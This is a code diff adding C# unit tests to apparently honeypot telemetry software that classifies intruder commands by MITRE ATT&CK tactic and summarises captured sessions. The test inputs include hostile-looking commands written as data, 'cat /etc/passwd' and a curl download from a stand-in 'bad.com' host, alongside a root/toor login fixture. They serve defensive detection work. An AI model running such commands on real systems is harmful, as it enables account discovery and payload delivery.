@@ -880,6 +880,71 @@ public class TelemetryWriteQueueTests
     }
 
     [Fact]
+    public void InferCommandObjective_ReturnsSensibleClassifications()
+    {
+        var (obj1, tactic1, tech1) = Logger.InferCommandObjective("uname -a");
+        Assert.Contains("kernel", obj1, StringComparison.OrdinalIgnoreCase);
+        Assert.Equal("Discovery", tactic1);
+        Assert.Contains("T1082", tech1);
+
+        var (obj2, tactic2, tech2) = Logger.InferCommandObjective("cat /etc/passwd");
+        Assert.Contains("account", obj2, StringComparison.OrdinalIgnoreCase);
+        Assert.Equal("Credential Access", tactic2);
+        Assert.Contains("T1087", tech2);
+
+        var (obj3, tactic3, tech3) = Logger.InferCommandObjective("curl -O http://bad.com/x.sh");
+        Assert.Contains("payload", obj3, StringComparison.OrdinalIgnoreCase);
+        Assert.Equal("Command and Control", tactic3);
+        Assert.Contains("T1105", tech3);
+    }
+
+    [Fact]
+    public void RecalculatePublicationData_GeneratesAccurateSummaryAndSessions()
+    {
+        var tempRepo = Path.Combine(Path.GetTempPath(), $"fp-recalc-{Guid.NewGuid():N}");
+        try
+        {
+            var dataDir = Path.Combine(tempRepo, "data");
+            Directory.CreateDirectory(dataDir);
+            var events = new[]
+            {
+                "{\"Timestamp\":\"2026-09-04T08:00:00Z\",\"Event\":\"session_start\",\"SessionId\":\"s1\",\"Sequence\":1,\"Data\":{\"RemoteEndpoint\":\"1.2.3.4:1234\"}}",
+                "{\"Timestamp\":\"2026-09-04T08:00:01Z\",\"Event\":\"auth_attempt\",\"SessionId\":\"s1\",\"Sequence\":2,\"Data\":{\"Username\":\"root\",\"Password\":\"toor\",\"Accepted\":true}}",
+                "{\"Timestamp\":\"2026-09-04T08:00:02Z\",\"Event\":\"shell_session_start\",\"SessionId\":\"s1\",\"Sequence\":3,\"Data\":{\"TimeToCompromiseMs\":200}}",
+                "{\"Timestamp\":\"2026-09-04T08:00:03Z\",\"Event\":\"command\",\"SessionId\":\"s1\",\"Sequence\":4,\"ExchangeId\":\"s1:1\",\"Data\":{\"Command\":\"uname -a\",\"MitreAttackTechniques\":[\"Discovery\"]}}",
+                "{\"Timestamp\":\"2026-09-04T08:00:04Z\",\"Event\":\"command_result\",\"SessionId\":\"s1\",\"Sequence\":5,\"ExchangeId\":\"s1:1\",\"Data\":{\"Response\":\"Linux\",\"ResponseDurationMs\":50}}",
+                "{\"Timestamp\":\"2026-09-04T08:00:05Z\",\"Event\":\"session_end\",\"SessionId\":\"s1\",\"Sequence\":6,\"Data\":{\"DurationSeconds\":5.0}}"
+            };
+            File.WriteAllLines(Path.Combine(dataDir, "events.jsonl"), events);
+
+            Logger.RecalculatePublicationData(tempRepo, "test");
+
+            Assert.True(File.Exists(Path.Combine(dataDir, "events_summary.json")));
+            Assert.True(File.Exists(Path.Combine(tempRepo, "global_stats.json")));
+            Assert.True(File.Exists(Path.Combine(dataDir, "sessions.json")));
+
+            var summary = System.Text.Json.JsonSerializer.Deserialize<HarvestSummary>(File.ReadAllText(Path.Combine(dataDir, "events_summary.json")));
+            Assert.NotNull(summary);
+            Assert.Equal(6, summary.TotalEvents);
+            Assert.Equal(1, summary.TotalShells);
+            Assert.Equal(1, summary.EventCounts["command"]);
+
+            var sessions = System.Text.Json.JsonSerializer.Deserialize<List<SessionDebrief>>(File.ReadAllText(Path.Combine(dataDir, "sessions.json")));
+            Assert.NotNull(sessions);
+            Assert.Single(sessions);
+            Assert.Equal("s1", sessions[0].SessionId);
+            Assert.True(sessions[0].AuthAccepted);
+            Assert.Single(sessions[0].Commands);
+            Assert.Equal("uname -a", sessions[0].Commands[0].Command);
+            Assert.Equal("Linux", sessions[0].Commands[0].Response);
+        }
+        finally
+        {
+            if (Directory.Exists(tempRepo)) Directory.Delete(tempRepo, true);
+        }
+    }
+
+    [Fact]
     public void TryEnqueue_ProcessesWritesBeforeDispose()
     {
         using var queue = new TelemetryWriteQueue();
